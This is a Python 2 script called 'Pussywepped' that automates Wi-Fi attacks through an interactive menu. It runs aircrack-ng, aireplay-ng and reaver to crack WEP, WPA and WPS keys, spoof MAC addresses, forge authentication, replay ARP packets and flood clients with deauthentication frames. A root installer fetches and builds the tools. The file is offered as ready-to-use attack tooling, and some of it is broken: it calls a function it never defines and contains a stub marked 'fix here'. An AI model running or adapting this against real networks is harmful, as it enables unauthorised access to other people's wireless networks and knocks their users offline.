#!/usr/bin/env python
import readline,os,sys,time,argparse

# Argument Parser
parser = argparse.ArgumentParser(description="It\'s like pussy whipped but for WEP encrypted networks. It\'s a script to streamline the cracking of wireless networks.  The newer version has expanded to taking on WPA networks too.  This is achieved with the new bagofdics directory which contains as you would expect... dictionary files.  The name is likely to change soon due to it not just being about WEP networks.", epilog="Pussywepped needs to be executed as root. QR!")
parser.add_argument("--install", dest="installation", action="store_true",
						 help="installs pussywepped to /usr/local/lib, aircrack-ng (from SVN), macchanger, and reaver-wps")
parser.add_argument("--uninstall", dest="uninstall", action="store_true",
						 help="uninstalls pussywepped from hard drive")
parser.add_argument("--update", dest="update", action="store_true",
						 help="updates pussywepped from github and updates dependent programs from source")

args = parser.parse_args()

# Installation
if args.installation == True:
	parent_path = os.getcwd()
	home_path = os.getenv("HOME")

	if os.geteuid() != 0:
		print "Needs to be run as root"
		sys.exit(1)
	
	filename = "\'"+os.path.basename(__file__)+"\'"
	if not os.path.exists('/usr/local/lib/pussywepped'):
		os.makedirs('/usr/local/lib/pussywepped')
		os.system('cp ./'+filename+' /usr/local/lib/pussywepped/')
		os.system('mv /usr/local/lib/pussywepped/'+filename+' /usr/local/lib/pussywepped/pussywepped.py')
		os.system('rm -rf ./'+filename)
		os.system('python /usr/local/lib/pussywepped/pussywepped.py --install')
		sys.exit(1)

	if not os.path.exists('/usr/bin/pussywepped'):
		file = open('/usr/bin/pussywepped','w',1)
		file.write('#!/bin/bash\n')
		file.write('python /usr/local/lib/pussywepped/pussywepped.py $*')
		file.close()
		os.system('chmod +x /usr/bin/pussywepped')

		exe_dkpg = True
		if not os.path.exists('/usr/bin/aircrack-ng') and not os.path.exists('/usr/local/bin/aircrack-ng'):
			os.system('dpkg --configure -a && apt-get install -f && apt-get update')
			os.system('apt-get install linux-headers-$(uname -r) build-essential make patch git gettext autoconf subversion tcl8.5 openssl zlib1g zlib1g-dev libssh2-1-dev libssl-dev libnl1 libnl-dev libpcap0.8 libpcap0.8-dev python-scapy python-dev cracklib-runtime macchanger-gtk tshark ethtool')
			exe_dkpg = False
			os.system('mkdir /usr/src/drivers')
			os.system('wget http://wireless.kernel.org/download/iw/iw-latest.tar.bz2 -P /usr/src/drivers')
			os.system('tar -jxvf /usr/src/drivers/iw-latest.tar.bz2 -C /usr/src/drivers/')
			iw_folder = os.popen('ls -d /usr/src/drivers/*/').read()
			os.system('make --directory='+iw_folder)
			os.system('make install --directory='+iw_folder)
			os.system('svn co http://trac.aircrack-ng.org/svn/trunk ~/Downloads/aircrack-ng')
			os.system('make --directory=~/Downloads/aircrack-ng/')
			os.system('make install --directory=~/Downloads/aircrack-ng/')

		if not os.path.exists('/usr/bin/reaver'):
			if exe_dkpg == True:
				os.system('dpkg --configure -a && apt-get install -f && apt-get update')
			os.system('apt-get install libpcap-dev libsqlite3-dev svn')
			os.system('svn co http://reaver-wps.googlecode.com/svn/trunk/ ~/Downloads/reaver')
			os.chdir(home_path+'/Downloads/reaver/src')
			os.system('./configure')
			os.system('make')
			os.system('make install')
			os.chdir(parent_path)

		sys.exit(1)

	print "Pussywepped is already installed"
	sys.exit(1)

#Uninstall
if args.uninstall == True:
	if os.geteuid() != 0:
		print "Needs to be run as root"
		sys.exit(1)

	if os.path.exists('/usr/local/lib/pussywepped'):
		os.system('cp /usr/local/lib/pussywepped/pussywepped.py ~/Desktop/')
		os.system('rm -rf /usr/bin/pussywepped')
		os.system('rm -rf /usr/local/lib/pussywepped')
		sys.exit(1)

	print "Pussywepped isn't installed"
	sys.exit(1)

#Update Pussywepped and SVN Repos
if args.update == True:
	parent_path = os.getcwd()
	home_path = os.getenv("HOME")

	if os.geteuid() != 0:
		print "Needs to be run as root"
		sys.exit(1)
		
	filename = os.path.basename(__file__)
	if os.path.exists('/usr/local/lib/pussywepped'):
		if not os.path.exists('/usr/local/lib/pussywepped/pussywepped_old.py'):
			os.system('dpkg --configure -a && apt-get install -f && apt-get update')
			os.system('apt-get install --reinstall git')
			if os.path.exists('/usr/local/lib/pussywepped/github/Pussywepped'):
				os.chdir('/usr/local/lib/pussywepped/github/Pussywepped')
				os.system('git pull https://www.github.com/shazbottkc/Pussywepped')
				os.chdir(parent_path)
			else:
				os.system('mkdir /usr/local/lib/pussywepped/github')
				os.chdir('/usr/local/lib/pussywepped/github')
				os.system('git clone https://www.github.com/shazbottkc/Pussywepped')
				os.chdir(parent_path)
			os.system('mv /usr/local/lib/pussywepped/pussywepped.py /usr/local/lib/pussywepped/pussywepped_old.py')
			os.system('mv /usr/local/lib/pussywepped/github/Pussywepped/pussywepped.py /usr/local/lib/pussywepped/pussywepped.py')
			os.system('pussywepped --update')
			sys.exit(1)
	
		if os.path.exists('/usr/local/lib/pussywepped/pussywepped_old.py'):
			os.system('rm -rf /usr/local/lib/pussywepped/pussywepped_old.py')
			os.system('apt-get install --reinstall linux-headers-$(uname -r) build-essential make patch gettext autoconf subversion tcl8.5 openssl zlib1g zlib1g-dev libssh2-1-dev libssl-dev libnl1 libnl-dev libpcap0.8 libpcap0.8-dev libpcap-dev libsqlite3-dev python-scapy python-dev cracklib-runtime macchanger-gtk tshark ethtool')
		
			if os.path.exists('/usr/local/bin/aircrack-ng'):
				os.system('rm -rf /usr/src/drivers/*')
				os.system('wget http://wireless.kernel.org/download/iw/iw-latest.tar.bz2 -P /usr/src/drivers')
				os.system('tar -jxvf /usr/src/drivers/iw-latest.tar.bz2 -C /usr/src/drivers/')
				iw_folder = os.popen('ls -d /usr/src/drivers/*/').read()
				os.system('make --directory='+iw_folder)
				os.system('make install --directory='+iw_folder)
				if os.path.exists(home_path+'/Downloads/aircrack-ng'):
					os.system('svn update ~/Downloads/aircrack-ng')
				else:
					os.system('svn co http://trac.aircrack-ng.org/svn/trunk ~/Downloads/aircrack-ng')
				os.system('make --directory=~/Downloads/aircrack-ng/')
				os.system('make install --directory=~/Downloads/aircrack-ng/')			
	
			if os.path.exists('/usr/bin/reaver'):
				if os.path.exists(home_path+'/Downloads/reaver'):
					os.system('svn update ~/Downloads/reaver')
				else:
					os.system('svn co http://reaver-wps.googlecode.com/svn/trunk/ ~/Downloads/reaver')
				os.chdir(home_path + '/Downloads/reaver/src')
				os.system('./configure')
				os.system('make')
				os.system('make install')
				os.chdir(parent_path)
	else:
		print "Pussywepped is not installed on the hard drive.  Run 'sudo python ./"+filename+" --install' (without quotes) for installation."
	sys.exit(1)

# Preflight checks
if os.geteuid() != 0:
	print "Needs to be run as root"
	sys.exit(1)

if not os.path.exists('/usr/local/lib/pussywepped/dics/'):
	os.makedirs('/usr/local/lib/pussywepped/dics/')

if not os.path.exists('/usr/local/lib/pussywepped/box/'):
	os.makedirs('/usr/local/lib/pussywepped/box/')	

# I couldn't find a better way to do this unless you want to call a system command
# Patched for Ubuntu 11.10+ and aircrack-ng & reaver from SVN
if not os.path.exists('/usr/bin/aircrack-ng') and not os.path.exists('/usr/local/bin/aircrack-ng'):
	print "aircrack-ng is not installed."
	sys.exit(1)

if not os.path.exists('/usr/bin/reaver'):
	print "reaver is not installed. Please install reaver to use wps cracking"



#######################################
# Functions!
######################################

def init(): 
   initlist= ';'.join(("service network-manager stop",
		"airmon-ng stop mon4",
		"airmon-ng stop mon3",
		"airmon-ng stop mon2",
		"airmon-ng stop mon1",
		"airmon-ng stop mon0",
		"airmon-ng stop "+interface,
		"ifconfig "+interface+" down",
		"airmon-ng start "+interface,
		"airmon-ng start "+interface,
		"ifconfig mon0 down",
		"ifconfig mon1 down",
		"macchanger -A mon0",
		"macchanger -A mon1",
		"ifconfig "+interface+" up",
		"ifconfig mon0 up",
		"ifconfig mon1 up"))
   os.system(initlist)
def macspoof():
   maclist= ';'.join(("ifconfig mon0 down",
		"macchanger -m "+spoofmac+" mon0",
		"ifconfig mon0 up",))
   os.system(maclist)
def macchange():
   macchlist= ';'.join(("ifconfig mon0 down",
#fix here!
		"ifconfig ",
		"macchanger -A mon0",
		"macchanger -A mon1",
		"ifconfig mon0 up",))
   os.system(macchlist)
def housekeeping():
   #back to normal
   houselist= ';'.join(("airmon-ng stop mon4",
		"airmon-ng stop mon3",
		"airmon-ng stop mon2",
		"airmon-ng stop mon1",
		"airmon-ng stop mon0",
		"airmon-ng stop "+interface,
		"service network-manager start"))
   os.system(houselist)
   os.sys.exit()

def scan():
   os.system("airodump-ng -t WEP -t WPA -t WPA1 -t WPA2 -a mon1")

def listen():
   print "airodump-ng -c "+channel+" --bssid "+bssid+" -w box/"+essid+" --showack --ignore-negative-one mon1"
   os.system("gnome-terminal -x airodump-ng -c "+channel+" --bssid "+bssid+" -w box/\""+essid+"\" --showack --ignore-negative-one mon1 &")

def fakeauth():
   fauth_success = "y"
   print "aireplay-ng -1 0 -a "+bssid+" -h "+station+" -e "+essid+" --ignore-negative-one mon0"
   os.system("aireplay-ng -1 0 -a "+bssid+" -h "+station+" -e \""+essid+"\" --ignore-negative-one mon0") 

def arpreplay():
   print "aireplay-ng -3 -b "+bssid+" -h "+station+" --ignore-negative-one mon0"
   os.system("gnome-terminal -x aireplay-ng -3 -b "+bssid+" -h "+station+" --ignore-negative-one mon0 &")

def deauthsome1():
   print "aireplay-ng -0 5 -a "+bssid+" -c "+target_station+" --ignore-negative-one mon0"
   os.system("gnome-terminal -x aireplay-ng -0 5 -a "+bssid+" -c "+target_station+" --ignore-negative-one mon0 &")

def WPA_PSK():
   print "aircrack-ng -w dics/password.lst -b "+bssid+" box/"+essid+"*.cap -l "+essid+"wpass.tkc"
   os.system("gnome-terminal -x aircrack-ng -w dics/"+essid+".lst -b "+bssid+" box/"+essid+"*.cap -l "+essid+"wpass.tkc")
   os.system("gnome-terminal -x aircrack-ng -w dics/password.lst -b "+bssid+" box/"+essid+"*.cap -l "+essid+"wpass.tkc")
   #wpa = open(bssid+'wpass.tkc')
   #print wpa.readlines("The wpa password is: ")

def WPS_Crack():
   print "reaver -i mon1 -b "+bssid+" -vv"
   os.system("gnome-terminal -x aireplay-ng mon0 -1 120 -a "+bssid+" -e "+essid+" -h "+station+" --ignore-negative-one")
   os.system("gnome-terminal -x reaver -i mon1 -b "+bssid+" -c "+channel+" -e "+essid)
   
def aircrack():
   print "aircrack-ng -z -b "+bssid+" box/"+essid+"*cap -l "+essid+"wpass.tkc"
   os.system("gnome-terminal -x aircrack-ng -z -b "+bssid+" box/"+essid+"*cap -l "+essid+"wpass.tkc")

def printpass():
   fileexist = os.path.isfile(essid+"wpass.tkc")
   print fileexist
   if fileexist == True:
		passfile = essid+"wpass.tkc"  
		getpass = open(passfile)
		puspass = getpass.readlines(1)
		print "Your most recent password was:"
		print puspass
   else:
		print "No password yet"

def fragout():
   os.system ("gnome-terminal -x aireplay-ng -5 -b \""+bssid+"\" -h \""+station+"\" --ignore-negative-one mon0")

def deauthlikeamofo():
   deauthsomeone = "aireplay-ng -0 9999 -a "+bssid+" -c "+target_station+" --ignore-negative-one mon0"
   print deauthsomeone
   os.system("gnome-terminal -x "+deauthsomeone+" &")

def connect():
   wepkey = raw_input("WEP Key: ")
   connectlist= ';'.join(("iwconfig "+interface+" essid "+essid+" mode managed channel "+channel+" key "+wepkey,
		"dhclient "+interface))
   os.system(connectlist)
   
#==========================qr==========================D


osscan = "blank"
while(osscan == "blank"):
	
	osscan = sys.platform
	if osscan == "linux2":
		    print "You are running Linux"
	elif osscan == "windows":
	  print "WTF? How did you get this running on Windows?"


interface = "wlan0"
interface = raw_input("interface: ")
init()
scan()

# input target prefs
bssid = raw_input("bssid: ")
essid = raw_input("essid: ")
channel = raw_input("channel: ")
macshow = os.popen("macchanger -s mon0")
station = macshow.read()[13:30]

# starts listening for ivs
listen()


cont = "n"
while (cont == "n"): 
	listen_selection = raw_input("\n 0  Change Target\n 1  Fake-auth(FAST)\n 2  ARP Replay\n 3  Deauth Someone\n 4  Frag Attack\n 5  WEP crack\n 6  WPA PSK Crack\n 7  Print Pass\n 8  Deauth like a mofo\n 9  Connect\n 10 WPS Cracking\n 11 Spoof Mac\n 12 Spoof AP\n 13 Handshake Bookaki\n q  Quit\n\nplease pick a number: ")
	if listen_selection == "0":
		scan()
		# input target prefs
		bssid = raw_input("bssid: ")
		essid = raw_input("essid: ")
		channel = raw_input("channel: ")
		macshow = os.popen("macchanger -s mon0")
		station = macshow.read()[13:30]
		listen()	
	elif listen_selection == "1":
		fakeauth()
	elif listen_selection == "2":
		arpreplay()
	elif listen_selection == "3":
		target_station = raw_input("Input station target: ")
		deauthsome1()
	elif listen_selection == "4":
		fragout()
	elif listen_selection == "5":
		aircrack()
	elif listen_selection == "6":
		WPA_PSK()	
	elif listen_selection == "7":
		printpass()
	elif listen_selection == "8":
		target_station = raw_input("Input station target: ")
		print "u jerk >:/"
		deauthlikeamofo()   
	elif listen_selection == "9":
		connect()	
	elif listen_selection == "10":
		WPS_Crack()
	elif listen_selection == "q":
		print "cleaning up"
		housekeeping()
	elif listen_selection == "qr":
		print "Oh god dammit, fuck you"
		housekeeping()
	elif listen_selection == "11":
		spoofmac = raw_input("mac? ")
		macspoof()
		station = spoofmac 
	elif listen_selection =="12":
		spoofap = raw_input("AP ESSID")
		apspoof()
	elif listen_selection == "quicky":
		print "performing quickie"
		fakeauth()
		arpreplay()
	else:
		print ">:("
	
print "I'm out biatch"
